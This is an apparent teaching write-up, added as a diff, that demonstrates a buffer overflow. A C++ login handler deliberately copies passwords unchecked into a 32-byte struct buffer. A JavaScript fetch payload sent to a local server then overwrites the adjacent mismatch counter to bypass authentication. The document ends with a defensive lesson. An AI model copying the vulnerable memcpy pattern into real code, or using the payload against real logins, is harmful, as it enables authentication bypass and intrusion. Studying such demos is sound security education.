@@ -1,0 +1,257 @@
+# Buffer Overflow Demo — Password Comparison
+
+## 1. Server-side vulnerable code
+
+The login handler stores the supplied password in a fixed-size 32-byte buffer and places an `unsigned int` immediately after it in the same struct.
+
+```cpp
+// MY VERY EPIC PASSWORD CHECK LOGIC :D
+struct {
+    char passwordcstr[32] = { 0 };
+    unsigned int k = 0;
+} temp;
+
+std::memcpy(
+    temp.passwordcstr,
+    password.c_str(),
+    password.size()
+);
+
+std::cout << temp.k << " "
+          << password.size() << " "
+          << password
+          << std::endl;
+
+for (int i = 0; i < 32; i++) {
+    if (user.password[i] != temp.passwordcstr[i])
+        temp.k++;
+}
+
+std::cout << temp.k << std::endl;
+
+if (temp.k == 0) {
+    res.set_content(private_page(user), "text/html");
+    return;
+}
+```
+
+### Vulnerability
+
+`passwordcstr` has room for exactly **32 bytes**:
+
+```text
+passwordcstr[0] ... passwordcstr[31]
+```
+
+However, `memcpy()` is instructed to copy:
+
+```cpp
+password.size()
+```
+
+bytes without checking whether that value is greater than 32.
+
+The following field is:
+
+```cpp
+unsigned int k;
+```
+
+Conceptually, the struct is laid out as:
+
+```text
+┌─────────────────────────────┐
+│ passwordcstr[32]            │
+│                             │
+│ bytes 0 ... 31              │
+├─────────────────────────────┤
+│ k                           │
+│ 4 bytes                     │
+└─────────────────────────────┘
+```
+
+Therefore, an input longer than 32 bytes can write beyond `passwordcstr` and corrupt `k`.
+
+The important property here is that the **struct makes the intended layout explicit**, unlike two independent local variables whose relative stack positions are not guaranteed by C++.
+
+---
+
+## 2. Why embedded NULL bytes matter
+
+The login input is represented as a C++ `std::string`.
+
+A `std::string` can contain embedded null bytes:
+
+```text
+x 00 x x x ...
+```
+
+`std::string::size()` counts those bytes.
+
+This differs from `strlen()`, which stops at the first `0x00`.
+
+The vulnerable copy uses:
+
+```cpp
+password.size()
+```
+
+rather than `strlen(password.c_str())`.
+
+Consequently, an embedded null does **not** cause `memcpy()` to stop.
+
+---
+
+## 3. Constructing the test request
+
+The test is performed from JavaScript using a `Uint8Array` so that the request contains actual byte values rather than relying on UTF-8 encoding of a JavaScript string.
+
+First construct the ordinary form data:
+
+```js
+const encoder = new TextEncoder();
+
+const b =
+    "username=admin&password=x\0xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx";
+
+const body = encoder.encode(b);
+```
+
+Then append the four bytes intended for the memory-corruption demonstration:
+
+```js
+const bytes = new Uint8Array([
+    0xE0,
+    0xFF,
+    0xFF,
+    0xFF
+]);
+
+const a = new Uint8Array(body.length + bytes.length);
+
+a.set(body);
+a.set(bytes, body.length);
+```
+
+The resulting request body consists of:
+
+```text
+username=admin&password=
+x
+00
+xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
+E0 FF FF FF
+```
+
+The significant part is that the password data contains an embedded `00` byte followed by additional bytes.
+
+---
+
+## 4. Sending the raw request
+
+The resulting `Uint8Array` can be supplied directly as the `fetch()` body:
+
+```js
+fetch("http://127.0.0.1:8080/login", {
+    headers: {
+        "content-type": "application/x-www-form-urlencoded"
+    },
+    body: a,
+    method: "POST",
+    mode: "cors",
+    credentials: "omit"
+});
+```
+
+Using `Uint8Array` is important here because putting `0xFF` directly into a JavaScript text string can result in UTF-8 encoding, changing one intended byte into multiple bytes.
+
+---
+
+## 5. What happens on the server
+
+The vulnerable operation is:
+
+```cpp
+std::memcpy(
+    temp.passwordcstr,
+    password.c_str(),
+    password.size()
+);
+```
+
+For an input longer than 32 bytes, the copy proceeds past the end of:
+
+```cpp
+temp.passwordcstr
+```
+
+and begins overwriting the following member:
+
+```cpp
+temp.k
+```
+
+The intended demonstration is therefore:
+
+```text
+Before memcpy:
+
+passwordcstr
+┌────────────────────────────────┐
+│ 32 bytes                       │
+└────────────────────────────────┘
+k
+┌──────────────┐
+│ 00 00 00 00  │
+└──────────────┘
+
+
+After oversized memcpy:
+
+passwordcstr
+┌────────────────────────────────┐
+│ first 32 bytes                 │
+└────────────────────────────────┘
+k
+┌──────────────┐
+│ overwritten  │
+└──────────────┘
+```
+
+Because `k` is subsequently used by the authentication logic:
+
+```cpp
+if (temp.k == 0) {
+    res.set_content(private_page(user), "text/html");
+    return;
+}
+```
+
+corrupting `k` can affect the result of the password comparison.
+
+---
+
+## 6. Key lesson
+
+The vulnerability is **not caused by HTTP itself**.
+
+The HTTP request is simply a way of supplying attacker-controlled bytes.
+
+The actual vulnerability is the unchecked operation:
+
+```cpp
+memcpy(destination, source, source_length);
+```
+
+where:
+
+```text
+destination capacity = 32 bytes
+source length         > 32 bytes
+```
+
+The fundamental rule is:
+
+> Never copy attacker-controlled data into a fixed-size buffer without ensuring that the number of bytes copied is within the destination's capacity.
+
+For the demonstration, AddressSanitizer can be enabled during compilation to make the out-of-bounds write visible to the debugger.
